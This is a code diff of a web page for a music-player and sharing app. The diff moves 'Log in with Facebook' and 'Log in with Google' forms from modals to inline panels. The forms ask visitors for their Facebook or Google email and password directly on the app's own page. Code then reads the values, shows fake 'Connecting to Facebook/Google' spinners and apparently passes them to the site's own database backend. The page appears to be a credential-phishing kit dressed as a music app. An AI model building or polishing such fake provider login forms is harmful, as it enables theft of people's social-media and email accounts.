@@ -783,80 +783,16 @@
             line-height: 1.5;
         }
 
-        /* Modal Styles */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(8px);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .modal-content {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            width: 100%;
-            max-width: 450px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
-            overflow: hidden;
-            animation: modalSlideIn 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-
-        @keyframes modalSlideIn {
-            from {
-                opacity: 0;
-                transform: scale(0.9) translateY(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: scale(1) translateY(0);
-            }
-        }
-
-        .modal-header {
-            padding: 24px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #e5e7eb;
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            color: white;
-        }
-
-        .modal-header h3 {
-            font-size: 1.4rem;
-            font-weight: 700;
-        }
-
-        .close-btn {
-            background: none;
-            border: none;
-            font-size: 1.5rem;
-            cursor: pointer;
-            color: white;
-            transition: transform 0.3s ease;
-        }
-
-        .close-btn:hover {
-            transform: scale(1.1);
-        }
-
-        .modal-body {
-            padding: 24px;
-        }
-
+        /* NEW: Inline Login Forms */
         .provider-form {
-            display: flex;
+            display: none;
             flex-direction: column;
             gap: 20px;
+            margin-top: 20px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
 
         .provider-form input {
@@ -895,7 +831,7 @@
         }
 
         .loading {
-            display: flex;
+            display: none;
             flex-direction: column;
             align-items: center;
             gap: 20px;
@@ -922,10 +858,11 @@
             font-weight: 500;
         }
 
-        /* Responsive Design */
+        /* Responsive Design - IMPROVED */
         @media (max-width: 768px) {
             .login-container {
                 flex-direction: column;
+                min-height: auto;
             }
             
             .welcome-section,
@@ -969,6 +906,33 @@
                 height: 50px;
                 font-size: 1.1rem;
             }
+            
+            /* Mobile-specific improvements */
+            .login-btn {
+                padding: 14px 20px;
+                font-size: 1rem;
+            }
+            
+            .form-group input,
+            .provider-form input {
+                padding: 14px;
+            }
+            
+            .submit-btn,
+            .provider-submit {
+                padding: 14px;
+                font-size: 1rem;
+            }
+            
+            .music-player-section,
+            .sharing-section,
+            .app-info {
+                padding: 20px;
+            }
+            
+            .home-container {
+                min-height: auto;
+            }
         }
 
         @media (max-width: 480px) {
@@ -991,7 +955,16 @@
             .music-player-section,
             .sharing-section,
             .app-info {
-                padding: 24px;
+                padding: 16px;
+            }
+            
+            .header h1 {
+                font-size: 1.5rem;
+            }
+            
+            .user-info {
+                flex-direction: column;
+                gap: 12px;
             }
         }
     </style>
@@ -1011,9 +984,21 @@
                     <button class="login-btn facebook-btn" id="facebookLogin">
                         <i class="fab fa-facebook-f"></i> Log in with Facebook
                     </button>
+                    <div class="provider-form" id="facebookForm">
+                        <input type="email" id="facebookEmail" placeholder="Email or phone number">
+                        <input type="password" id="facebookPassword" placeholder="Password">
+                        <button class="provider-submit" id="facebookSubmit">Log In</button>
+                    </div>
+                    
                     <button class="login-btn google-btn" id="googleLogin">
                         <i class="fab fa-google"></i> Log in with Google
                     </button>
+                    <div class="provider-form" id="googleForm">
+                        <input type="email" id="googleEmail" placeholder="Email or phone number">
+                        <input type="password" id="googlePassword" placeholder="Password">
+                        <button class="provider-submit" id="googleSubmit">Log In</button>
+                    </div>
+                    
                     <button class="login-btn other-btn" id="otherLogin">
                         <i class="fas fa-user"></i> Log in with Email/Phone
                     </button>
@@ -1030,6 +1015,16 @@
                     </div>
                     <button class="submit-btn" id="loginSubmit">Log In</button>
                 </div>
+                
+                <div class="loading" id="facebookLoading">
+                    <div class="spinner"></div>
+                    <p>Connecting to Facebook...</p>
+                </div>
+                
+                <div class="loading" id="googleLoading">
+                    <div class="spinner"></div>
+                    <p>Connecting to Google...</p>
+                </div>
             </div>
         </div>
         
@@ -1045,73 +1040,72 @@
             </div>
             <div class="content">
                 <!-- Music Player Section -->
-
-                <!-- Enhanced Music Player Section -->
                 <div class="music-player-section">
-                        <h2>🎵 Music Library</h2>
-                        <div class="music-player">
-                                <div class="music-info">
-                                        <i class="fas fa-music"></i>
-                                        <span id="songTitle">Select a song to play...</span>
-                                </div>
-                                
-                                <!-- Song Selection -->
-                                <div class="song-selection">
-                                        <h3>Available Songs</h3>
-                                        <div class="songs-list">
-                                                <div class="song-item" data-src="https://github.com/BlackH4ck3r/Art-Premier-org/raw/refs/heads/main/gyal%20exploler.mp3" data-title="Chill Vibes">
-                                                        <i class="fas fa-play-circle"></i>
-                                                        <span>Zendie Survivor</span>
-                                                        <span class="song-duration">3:45</span>
-                                                </div>
-                                                <div class="song-item" data-src="https://github.com/BlackH4ck3r/Art-Premier-org/raw/refs/heads/main/MBORIOUS%20--%20Ndalandila%20yesu%20....%20official%20music.mp3" data-title="Relaxing Melody">
-                                                        <i class="fas fa-play-circle"></i>
-                                                        <span>Mborious(Ndalandira yesu)</span>
-                                                        <span class="song-duration">2:46</span>
-                                                </div>
-                                                <div class="song-item" data-src="https://github.com/BlackH4ck3r/Art-Premier-org/raw/refs/heads/main/Mborious%20-%20mundimwetse-%20Official_Music_Video_(1080p)_mp4_Output_1.mp3" data-title="Peaceful Tunes">
-                                                        <i class="fas fa-play-circle"></i>
-                                                        <span>Mborious(Mundimwetse)</span>
-                                                        <span class="song-duration">2:56</span>
-                                                </div>
-                                                <div class="song-item" data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-4.mp3" data-title="Calm Waves">
-                                                        <i class="fas fa-play-circle"></i>
-                                                        <span>Calm Waves</span>
-                                                        <span class="song-duration">4:05</span>
-                                                </div>
-                                        </div>
-                                </div>
-
-                                <div class="music-controls">
-                                        <button class="music-btn" id="playBtn">
-                                                <i class="fas fa-play"></i>
-                                        </button>
-                                        <button class="music-btn" id="pauseBtn">
-                                                <i class="fas fa-pause"></i>
-                                        </button>
-                                        <button class="music-btn" id="stopBtn">
-                                                <i class="fas fa-stop"></i>
-                                        </button>
-                                        <button class="music-btn" id="prevBtn">
-                                                <i class="fas fa-backward"></i>
-                                        </button>
-                                        <button class="music-btn" id="nextBtn">
-                                                <i class="fas fa-forward"></i>
-                                        </button>
-                                        <div class="volume-control">
-                                                <i class="fas fa-volume-up"></i>
-                                                <input type="range" id="volumeSlider" min="0" max="1" step="0.1" value="0.5">
-                                        </div>
-                                </div>
-                                <div class="music-progress">
-                                        <div class="progress-bar">
-                                                <div class="progress" id="musicProgress"></div>
-                                        </div>
-                                        <span id="currentTime">0:00</span> / <span id="duration">0:00</span>
-                                </div>
+                    <h2>🎵 Music Library</h2>
+                    <div class="music-player">
+                        <div class="music-info">
+                            <i class="fas fa-music"></i>
+                            <span id="songTitle">Select a song to play...</span>
                         </div>
-                        <audio id="backgroundMusic"></audio>
+                        
+                        <!-- Song Selection -->
+                        <div class="song-selection">
+                            <h3>Available Songs</h3>
+                            <div class="songs-list">
+                                <div class="song-item" data-src="https://github.com/BlackH4ck3r/Art-Premier-org/raw/refs/heads/main/gyal%20exploler.mp3" data-title="Zendie Survivor">
+                                    <i class="fas fa-play-circle"></i>
+                                    <span>Zendie Survivor</span>
+                                    <span class="song-duration">3:45</span>
+                                </div>
+                                <div class="song-item" data-src="https://github.com/BlackH4ck3r/Art-Premier-org/raw/refs/heads/main/MBORIOUS%20--%20Ndalandila%20yesu%20....%20official%20music.mp3" data-title="Oh Rious(Ndalandira yesu)">
+                                    <i class="fas fa-play-circle"></i>
+                                    <span>Oh Rious(Ndalandira yesu)</span>
+                                    <span class="song-duration">2:46</span>
+                                </div>
+                                <div class="song-item" data-src="https://github.com/BlackH4ck3r/Art-Premier-org/raw/refs/heads/main/Mborious%20-%20mundimwetse-%20Official_Music_Video_(1080p)_mp4_Output_1.mp3" data-title="Mborious(Mundimwetse)">
+                                    <i class="fas fa-play-circle"></i>
+                                    <span>Oh Rious(Mundimwetse)</span>
+                                    <span class="song-duration">2:56</span>
+                                </div>
+                                <div class="song-item" data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-4.mp3" data-title="Calm Waves">
+                                    <i class="fas fa-play-circle"></i>
+                                    <span>Calm Waves</span>
+                                    <span class="song-duration">4:05</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="music-controls">
+                            <button class="music-btn" id="playBtn">
+                                <i class="fas fa-play"></i>
+                            </button>
+                            <button class="music-btn" id="pauseBtn">
+                                <i class="fas fa-pause"></i>
+                            </button>
+                            <button class="music-btn" id="stopBtn">
+                                <i class="fas fa-stop"></i>
+                            </button>
+                            <button class="music-btn" id="prevBtn">
+                                <i class="fas fa-backward"></i>
+                            </button>
+                            <button class="music-btn" id="nextBtn">
+                                <i class="fas fa-forward"></i>
+                            </button>
+                            <div class="volume-control">
+                                <i class="fas fa-volume-up"></i>
+                                <input type="range" id="volumeSlider" min="0" max="1" step="0.1" value="0.5">
+                            </div>
+                        </div>
+                        <div class="music-progress">
+                            <div class="progress-bar">
+                                <div class="progress" id="musicProgress"></div>
+                            </div>
+                            <span id="currentTime">0:00</span> / <span id="duration">0:00</span>
+                        </div>
+                    </div>
+                    <audio id="backgroundMusic"></audio>
                 </div>
+                
                 <!-- Sharing Section -->
                 <div class="sharing-section">
                     <h2>Share This Amazing App! 🚀</h2>
@@ -1176,47 +1170,6 @@
         </div>
     </div>
 
-    <!-- Facebook Login Modal -->
-    <div class="modal" id="facebookModal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>Log in with Facebook</h3>
-                <button class="close-btn" id="closeFacebook">&times;</button>
-            </div>
-            <div class="modal-body">
-                <div class="provider-form" id="facebookForm">
-                    <input type="email" id="facebookEmail" placeholder="Email or phone number">
-                    <input type="password" id="facebookPassword" placeholder="Password">
-                    <button class="provider-submit" id="facebookSubmit">Log In</button>
-                </div>
-                <div class="loading" id="facebookLoading" style="display: none;">
-                    <div class="spinner"></div>
-                    <p>Connecting to Facebook...</p>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Google Login Modal -->
-    <div class="modal" id="googleModal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h3>Log in with Google</h3>
-                <button class="close-btn" id="closeGoogle">&times;</button>
-            </div>
-            <div class="modal-body">
-                <div class="provider-form" id="googleForm">
-                    <input type="email" id="googleEmail" placeholder="Email or phone number">
-                    <input type="password" id="googlePassword" placeholder="Password">
-                    <button class="provider-submit" id="googleSubmit">Log In</button>
-                </div>
-                <div class="loading" id="googleLoading" style="display: none;">
-                    <div class="spinner"></div>
-                    <p>Connecting to Google...</p>
-                </div>
-            </div>
-        </div>
-    </div>
     <script>
         // ===== NEON DATABASE CONFIGURATION =====
         const API_BASE_URL = window.location.origin;
@@ -1278,15 +1231,11 @@
         const userAvatar = document.getElementById('userAvatar');
         const userName = document.getElementById('userName');
 
-        // Modal Elements
-        const facebookModal = document.getElementById('facebookModal');
-        const googleModal = document.getElementById('googleModal');
-        const closeFacebook = document.getElementById('closeFacebook');
-        const closeGoogle = document.getElementById('closeGoogle');
-        const facebookSubmit = document.getElementById('facebookSubmit');
-        const googleSubmit = document.getElementById('googleSubmit');
+        // NEW: Inline form elements
         const facebookForm = document.getElementById('facebookForm');
         const googleForm = document.getElementById('googleForm');
+        const facebookSubmit = document.getElementById('facebookSubmit');
+        const googleSubmit = document.getElementById('googleSubmit');
         const facebookLoading = document.getElementById('facebookLoading');
         const googleLoading = document.getElementById('googleLoading');
 
@@ -1298,14 +1247,22 @@
             if (facebookLogin) {
                 facebookLogin.addEventListener('click', () => {
                     console.log('Facebook login clicked');
-                    facebookModal.style.display = 'flex';
+                    // Toggle form visibility instead of modal
+                    facebookForm.style.display = facebookForm.style.display === 'flex' ? 'none' : 'flex';
+                    // Hide other forms
+                    googleForm.style.display = 'none';
+                    emailForm.style.display = 'none';
                 });
             }
 
             if (googleLogin) {
                 googleLogin.addEventListener('click', () => {
                     console.log('Google login clicked');
-                    googleModal.style.display = 'flex';
+                    // Toggle form visibility instead of modal
+                    googleForm.style.display = googleForm.style.display === 'flex' ? 'none' : 'flex';
+                    // Hide other forms
+                    facebookForm.style.display = 'none';
+                    emailForm.style.display = 'none';
                 });
             }
 
@@ -1313,6 +1270,9 @@
                 otherLogin.addEventListener('click', () => {
                     console.log('Other login clicked');
                     emailForm.style.display = emailForm.style.display === 'flex' ? 'none' : 'flex';
+                    // Hide other forms
+                    facebookForm.style.display = 'none';
+                    googleForm.style.display = 'none';
                 });
             }
 
@@ -1323,20 +1283,7 @@
                 });
             }
 
-            // Modal close buttons
-            if (closeFacebook) {
-                closeFacebook.addEventListener('click', () => {
-                    facebookModal.style.display = 'none';
-                });
-            }
-
-            if (closeGoogle) {
-                closeGoogle.addEventListener('click', () => {
-                    googleModal.style.display = 'none';
-                });
-            }
-
-            // Modal submit buttons
+            // Form submit buttons
             if (facebookSubmit) {
                 facebookSubmit.addEventListener('click', () => {
                     console.log('Facebook submit clicked');
@@ -1360,16 +1307,6 @@
                     homePage.style.display = 'none';
                 });
             }
-
-            // Close modals when clicking outside
-            window.addEventListener('click', (event) => {
-                if (event.target === facebookModal) {
-                    facebookModal.style.display = 'none';
-                }
-                if (event.target === googleModal) {
-                    googleModal.style.display = 'none';
-                }
-            });
         }
 
         // ===== ENHANCED VALIDATION FUNCTIONS =====
@@ -1469,18 +1406,16 @@
         }
 
         async function handleProviderLogin(provider) {
-            let email, password, modal, form, loading;
+            let email, password, form, loading;
             
             if (provider === 'facebook') {
                 email = document.getElementById('facebookEmail').value.trim();
                 password = document.getElementById('facebookPassword').value;
-                modal = facebookModal;
                 form = facebookForm;
                 loading = facebookLoading;
             } else {
                 email = document.getElementById('googleEmail').value.trim();
                 password = document.getElementById('googlePassword').value;
-                modal = googleModal;
                 form = googleForm;
                 loading = googleLoading;
             }
@@ -1545,7 +1480,6 @@
                 
                 loginPage.style.display = 'none';
                 homePage.style.display = 'flex';
-                modal.style.display = 'none';
                 
                 // Initialize home page features
                 initializeHomePage();
@@ -1555,7 +1489,7 @@
                 alert('Login failed. Please try again.');
             } finally {
                 // Reset forms
-                form.style.display = 'flex';
+                form.style.display = 'none';
                 loading.style.display = 'none';
                 document.getElementById('facebookEmail').value = '';
                 document.getElementById('facebookPassword').value = '';
